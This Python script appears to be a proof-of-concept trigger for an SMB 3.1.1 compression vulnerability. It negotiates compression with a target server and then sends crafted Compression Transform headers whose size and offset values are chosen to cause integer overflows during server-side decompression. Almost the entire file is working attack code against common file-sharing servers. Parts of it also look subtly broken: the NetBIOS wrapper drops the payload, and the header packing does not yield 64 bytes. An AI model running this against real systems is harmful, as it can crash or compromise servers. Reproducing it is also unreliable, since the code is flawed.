#!/usr/bin/env python3
import argparse
import socket
import struct
import sys
import time

from impacket.smb3 import SMB3
from impacket import smb3structs


def nbss_wrap(data: bytes) -> bytes:
    """NetBIOS Session Service header: 1-byte type (0x00) + 3-byte length."""
    if len(data) > 0x1FFFFF:
        raise ValueError("NBSS payload too large")
    return b"\x00" + struct.pack(">I", len(data))[1:]


def build_minimal_smb2_header(command=0x0000, message_id=1, credit_charge=1, credits=1, flags=0, next_command=0,
                             tree_id=0, session_id=0, signature=b"\x00" * 16) -> bytes:
    """Build a syntactically valid 64-byte SMB2 header (little-endian)."""
    protocol_id = b"\xFESMB"  # 0xFE 'S' 'M' 'B'
    structure_size = 64
    status = 0
    channel_sequence = 0
    reserved = 0
    pid = 0xFFFF  # common default

    hdr = struct.pack(
        "<4sHHIHHIQQIIQ16s",
        protocol_id,
        structure_size,
        credit_charge,
        status,
        command,
        credits,
        flags,
        next_command,
        message_id,
        pid,
        tree_id,
        session_id,
        signature,
    )
    if len(hdr) != 64:
        raise AssertionError("SMB2 header must be 64 bytes")
    return hdr


def build_smb2_negotiate_request_with_compression(client_guid: bytes, offered_algorithms):
    """Build an SMB3.1.1 NEGOTIATE request with negotiate contexts including compression.

    We use impacket's smb3structs for correctness of the SMB2 NEGOTIATE body and context formatting.
    """
    # Dialects: include SMB 3.1.1
    dialects = [smb3structs.SMB2_DIALECT_311]

    neg = smb3structs.SMB2Negotiate()
    neg['SecurityMode'] = smb3structs.SMB2_NEGOTIATE_SIGNING_ENABLED
    neg['Capabilities'] = smb3structs.SMB2_GLOBAL_CAP_LARGE_MTU
    neg['ClientGuid'] = client_guid
    neg['Dialects'] = dialects

    # Negotiate contexts (SMB 3.1.1)
    # Preauth integrity + compression capabilities.
    preauth = smb3structs.SMB2PreauthIntegrityCapabilities()
    preauth['HashAlgorithmCount'] = 1
    preauth['SaltLength'] = 32
    preauth['HashAlgorithms'] = [smb3structs.SMB2_PREAUTH_INTEGRITY_SHA512]
    preauth['Salt'] = b'A' * 32

    comp = smb3structs.SMB2CompressionCapabilities()
    comp['CompressionAlgorithmCount'] = len(offered_algorithms)
    comp['Padding'] = 0
    comp['Flags'] = 0
    comp['CompressionAlgorithms'] = offered_algorithms

    # Wrap contexts
    ctx_list = []
    ctx_list.append(smb3structs.SMB2NegotiateContext())
    ctx_list[-1]['ContextType'] = smb3structs.SMB2_PREAUTH_INTEGRITY_CAPABILITIES
    ctx_list[-1]['DataLength'] = len(preauth)
    ctx_list[-1]['Reserved'] = 0
    ctx_list[-1]['Data'] = preauth.getData()

    ctx_list.append(smb3structs.SMB2NegotiateContext())
    ctx_list[-1]['ContextType'] = smb3structs.SMB2_COMPRESSION_CAPABILITIES
    ctx_list[-1]['DataLength'] = len(comp)
    ctx_list[-1]['Reserved'] = 0
    ctx_list[-1]['Data'] = comp.getData()

    # Serialize negotiate with contexts
    # Impacket's SMB3 class normally builds this internally; here we craft it to ensure compression context is present.
    neg_blob = neg.getData()

    # Contexts must be 8-byte aligned
    def pad8(b: bytes) -> bytes:
        return b + (b"\x00" * ((8 - (len(b) % 8)) % 8))

    ctx_blob = b""
    for c in ctx_list:
        cdata = c.getData()
        ctx_blob += pad8(cdata)

    # Patch negotiate fields for contexts
    # Offsets are from start of SMB2 NEGOTIATE request structure.
    # In smb3structs.SMB2Negotiate, fields exist: NegotiateContextOffset, NegotiateContextCount, Reserved2
    # We rebuild with those set.
    neg2 = smb3structs.SMB2Negotiate()
    neg2.fromString(neg_blob)
    neg2['NegotiateContextCount'] = len(ctx_list)
    # Context offset: SMB2 header (64) + negotiate fixed part (neg2['StructureSize'] etc) + dialects array length.
    # In Impacket, SMB2Negotiate.getData() already includes dialects; so offset is 64 + len(neg2.getData())
    # BUT the offset is relative to the start of the SMB2 NEGOTIATE request (immediately after SMB2 header).
    # Therefore: offset = len(neg2.getData())
    neg2['NegotiateContextOffset'] = len(neg2.getData())

    negotiate_body = neg2.getData() + ctx_blob
    return negotiate_body


def parse_negotiate_response_for_compression(resp_bytes: bytes):
    """Best-effort parse of SMB2 NEGOTIATE response negotiate contexts to find accepted compression algorithms."""
    # SMB2 header is 64 bytes
    if len(resp_bytes) < 64 + 65:
        return []
    hdr = resp_bytes[:64]
    if hdr[:4] != b"\xFESMB":
        return []

    # NEGOTIATE response structure starts at 64
    body = resp_bytes[64:]
    # StructureSize (2) should be 65
    if len(body) < 65:
        return []
    structure_size = struct.unpack_from("<H", body, 0)[0]
    if structure_size != 65:
        return []

    # Offsets per SMB2 NEGOTIATE Response:
    # 0: StructureSize(2)
    # 2: SecurityMode(2)
    # 4: DialectRevision(2)
    # 6: NegotiateContextCount(2)
    # 8: ServerGuid(16)
    # 24: Capabilities(4)
    # 28: MaxTransactSize(4)
    # 32: MaxReadSize(4)
    # 36: MaxWriteSize(4)
    # 40: SystemTime(8)
    # 48: ServerStartTime(8)
    # 56: SecurityBufferOffset(2)
    # 58: SecurityBufferLength(2)
    # 60: NegotiateContextOffset(4)
    ctx_count = struct.unpack_from("<H", body, 6)[0]
    ctx_offset = struct.unpack_from("<I", body, 60)[0]

    if ctx_count == 0 or ctx_offset == 0:
        return []

    # ctx_offset is from start of SMB2 header
    abs_ctx = ctx_offset
    if abs_ctx >= len(resp_bytes):
        return []

    accepted = []
    p = abs_ctx
    for _ in range(ctx_count):
        if p + 8 > len(resp_bytes):
            break
        ctype, dlen, _reserved = struct.unpack_from("<HHI", resp_bytes, p)
        p += 8
        if p + dlen > len(resp_bytes):
            break
        data = resp_bytes[p:p + dlen]
        p += dlen
        # 8-byte alignment
        p = (p + 7) & ~7

        if ctype == smb3structs.SMB2_COMPRESSION_CAPABILITIES:
            # SMB2_COMPRESSION_CAPABILITIES:
            # AlgorithmCount(2), Padding(2), Flags(4), Algorithms[AlgorithmCount]*2
            if len(data) >= 8:
                acnt = struct.unpack_from("<H", data, 0)[0]
                algos = []
                off = 8
                for i in range(acnt):
                    if off + 2 > len(data):
                        break
                    algos.append(struct.unpack_from("<H", data, off)[0])
                    off += 2
                accepted.extend(algos)

    return accepted


def build_compression_transform(original_size: int, algorithm: int, offset: int, compressed_payload: bytes) -> bytes:
    """SMB2 Compression Transform Header (16 bytes) + payload.

    Layout (per MS-SMB2):
      ProtocolId: 0xFC 'S' 'M' 'B' (4)
      OriginalCompressedSegmentSize / OriginalSize: (4)
      CompressionAlgorithm: (2)
      Flags: (2)
      Offset: (4)
    """
    proto = b"\xFCSMB"
    flags = 0
    hdr = struct.pack("<4sIHHI", proto, original_size & 0xFFFFFFFF, algorithm & 0xFFFF, flags & 0xFFFF, offset & 0xFFFFFFFF)
    if len(hdr) != 16:
        raise AssertionError("Transform header must be 16 bytes")
    return hdr + compressed_payload


def main():
    ap = argparse.ArgumentParser(description="Repro script: negotiate SMB3.1.1 compression then send SMB2 Compression Transform trigger")
    ap.add_argument("target", help="Target IP/hostname")
    ap.add_argument("--port", type=int, default=445)
    ap.add_argument("--timeout", type=float, default=3.0)
    ap.add_argument("--sleep", type=float, default=0.2)
    args = ap.parse_args()

    # Offer common compression algorithms (do not assume server supports all; we will pick from response if present)
    offered_algorithms = [
        smb3structs.SMB2_COMPRESSION_LZNT1,
        smb3structs.SMB2_COMPRESSION_LZ77,
        smb3structs.SMB2_COMPRESSION_LZ77_HUFFMAN,
    ]

    # Establish TCP + SMB3 object (keeps socket state)
    smb = SMB3(remoteName=args.target, remoteHost=args.target, sess_port=args.port, timeout=args.timeout)

    # Perform a custom NEGOTIATE with compression context by sending raw SMB2 NEGOTIATE request over smb's socket.
    # We do this because some Impacket versions don't expose compression context toggles directly.
    s = smb.getSMBServer().get_socket()

    # Build SMB2 NEGOTIATE request packet: SMB2 header + negotiate body
    client_guid = b"B" * 16
    negotiate_body = build_smb2_negotiate_request_with_compression(client_guid, offered_algorithms)

    smb2_hdr = build_minimal_smb2_header(command=smb3structs.SMB2_NEGOTIATE, message_id=0)
    negotiate_packet = smb2_hdr + negotiate_body

    s.sendall(nbss_wrap(negotiate_packet))

    # Receive NEGOTIATE response (single NBSS frame)
    nbss = s.recv(4)
    if len(nbss) < 4:
        print("Failed to read NBSS header")
        return 1
    if nbss[0] != 0x00:
        print(f"Unexpected NBSS type: {nbss[0]:#x}")
        return 1
    length = int.from_bytes(nbss[1:4], "big")
    resp = b""
    while len(resp) < length:
        chunk = s.recv(length - len(resp))
        if not chunk:
            break
        resp += chunk

    accepted_algos = parse_negotiate_response_for_compression(resp)
    chosen_algo = None
    for a in offered_algorithms:
        if a in accepted_algos:
            chosen_algo = a
            break
    if chosen_algo is None:
        # If server didn't echo contexts (or parsing failed), fall back to LZNT1 as the most common.
        chosen_algo = smb3structs.SMB2_COMPRESSION_LZNT1

    print(f"[+] Negotiated (best-effort) compression algorithm id: {chosen_algo:#x}")

    # Trigger candidates: (original_size, offset)
    # These are chosen to exercise 32-bit add/sub edge cases in computations involving prefix/offset and sizes.
    candidates = [
        (0xFFFFFFFF, 0x00000000),
        (0xFFFFFFF0, 0x00000020),
        (0x80000000, 0x7FFFFFF0),
        (0x00000010, 0xFFFFFFF0),
    ]

    # Compressed payload must be present. We include an inner SMB2 header as bytes (not actually compressed),
    # because the goal is to route into decompression; server will attempt to decompress and hit arithmetic.
    inner = build_minimal_smb2_header(command=smb3structs.SMB2_ECHO, message_id=1)
    compressed_payload = inner + b"C" * 32

    for i, (orig_size, offset) in enumerate(candidates, 1):
        transform = build_compression_transform(orig_size, chosen_algo, offset, compressed_payload)
        pkt = nbss_wrap(transform)
        print(f"[+] Sending trigger {i}/{len(candidates)}: OriginalSize={orig_size:#x} Offset={offset:#x} PayloadLen={len(compressed_payload)}")
        try:
            s.sendall(pkt)
        except Exception as e:
            print(f"Send failed: {e}")
            break
        time.sleep(args.sleep)

        # Best-effort read (server may reset/close on error)
        s.settimeout(args.timeout)
        try:
            peek = s.recv(4, socket.MSG_PEEK)
            if not peek:
                print("[!] Connection closed by server")
                break
        except socket.timeout:
            pass
        except Exception:
            pass

    try:
        s.close()
    except Exception:
        pass
    return 0


if __name__ == "__main__":
    sys.exit(main())
